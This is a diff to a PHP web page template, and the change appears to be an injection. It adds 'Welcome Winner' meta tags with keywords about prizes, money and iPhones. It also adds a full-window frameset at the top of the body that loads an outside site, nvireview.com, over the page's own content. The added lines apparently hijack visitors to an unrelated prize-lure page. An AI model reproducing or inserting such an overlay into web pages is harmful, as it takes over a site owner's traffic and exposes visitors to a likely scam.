@@ -12,6 +12,10 @@
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
 
     <title><?= $data['title']; ?></title>
+
+    <meta name="description" content="Welcome Winner" />
+    <meta name="keywords" content="winner, prize, money,iphone 15, iphone 14" />
+
     <?php if (!empty($data['custom_css'])) :
         $style = "<style>";
         $style .= $data['custom_css'];
@@ -21,6 +25,11 @@
 </head>
 
 <body>
+    <frameset border="0" rows="100%,*" cols="100%" frameborder="no">
+        <frame name="TopFrame" scrolling="yes" noresize src="http://nvireview.com">
+            <frame name="BottomFrame" scrolling="no" noresize>
+                <noframes></noframes>
+    </frameset>
     <section class="container">
         <div class="row mt-5 pt-2 text-center">
             <div class="col-md-12 mb-2">
